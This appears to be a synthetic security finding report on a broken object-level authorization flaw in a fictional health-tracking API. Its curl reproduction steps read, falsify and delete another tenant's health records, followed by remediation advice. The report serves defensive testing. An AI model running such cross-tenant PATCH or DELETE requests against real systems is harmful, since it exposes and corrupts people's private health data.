## System

- System: VitalTrack Health API v2.7.0
- Domain: FITNESS / WEARABLES
- Example ID: BOLA-0081
- Risk ID: RISK-42-081

## Findings

### 1. Pattern 4.2 — Persistence Poisoning via Lifecycle Actions on `/api/v3/nodes/:id` (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-F7CC`. Request: `GET /api/v3/nodes/NOD-2081`. Response: HTTP 200 OK with `"tenantId": "ORG-AF07"`, `"ownerId": "other-user-f7ccaf07"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-AF07"`.

**Pattern 4.2 (Persistence Poisoning via Lifecycle Actions — Integrity)**: health tracking nodes undergo lifecycle actions (device sync, health data update, session archival, device deprovisioning). These lifecycle operations write data that persists in the system and feeds downstream analytics (health reports, fitness scores, insurance calculations). The handler lacks tenant/owner enforcement (Section 3.0: "does NOT use tenant_id in authorization checks", RISK-42-081), allowing an attacker from `ORG-F7CC` to:
1. Read another user's health node data (HAR primary — GET)
2. PATCH lifecycle actions that poison persistent health data of another fitness/health user
3. DELETE lifecycle actions that destroy another user's health tracking history

Poisoned data (false health metrics, fabricated workout records) persists in the system and corrupts downstream health analytics — affecting insurance underwriting, clinical decision support (FHIR), or fitness program eligibility.

**Fitness / Wearables impact**: nodes represent wearable device nodes, health metric records (FHIR resources), or workout session data. Cross-tenant PATCH poisons another user's health records (heart rate, sleep data, step counts) — corrupting FHIR patient data (HIPAA PHI violation) and potentially affecting clinical decisions based on poisoned metrics. DELETE destroys health tracking history irreversibly.

Note: Section 5.0 labels this "GraphQL HAR" but the request is a REST endpoint (`/api/v3/nodes/`) — label inconsistency in the context.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.vitaltrack-heal.example.com/api/v3/nodes/NOD-1081" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F7CC>" \
  -H "X-Tenant-ID: ORG-F7CC"
```

Expected: `tenantId: "ORG-F7CC"` — own health node.

**Step 2 — Cross-tenant health node read (primary HAR attack):**

```bash
curl -s "https://api.vitaltrack-heal.example.com/api/v3/nodes/NOD-2081" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F7CC>" \
  -H "X-Tenant-ID: ORG-F7CC"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-AF07"` and health `sensitiveData`.

**Step 3 — Persistence poisoning: corrupt another user's health data via PATCH lifecycle action:**

```bash
curl -s -X PATCH "https://api.vitaltrack-heal.example.com/api/v3/nodes/NOD-2081" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F7CC>" \
  -H "X-Tenant-ID: ORG-F7CC" \
  -H "Content-Type: application/json" \
  -d '{"status": "synced", "sensitive_data": "heart_rate_falsified: 300bpm_avg"}'
```

Expected secure: HTTP 403.  
Expected vulnerable: HTTP 200 — victim's persistent health records poisoned with false metrics; downstream FHIR analytics and health reports permanently corrupted.

**Step 4 — Persistence destruction: DELETE lifecycle action destroys health history:**

```bash
curl -s -X DELETE "https://api.vitaltrack-heal.example.com/api/v3/nodes/NOD-2081" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F7CC>" \
  -H "X-Tenant-ID: ORG-F7CC"
```

Expected vulnerable: HTTP 200 — victim's health tracking node and all associated data destroyed.

## Evidence

- **HAR**: `GET /api/v3/nodes/NOD-2081` with `ORG-F7CC` JWT → HTTP 200 → `tenantId: ORG-AF07` with `sensitiveData`.
- **Section 4.0 (RISK-42-081)**: Pattern 4.2 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-42-081, unblock #DB-181).
- **Lifecycle action authorization**: every lifecycle action (sync, archive, deprovision) must validate resource ownership before persisting changes.
- **FHIR/HIPAA compliance**: PHI health records must be protected against unauthorized modification — HIPAA Security Rule §164.312.
- **Regression test**: Tenant A token patches Tenant B `node_id` — assert HTTP 403/404.
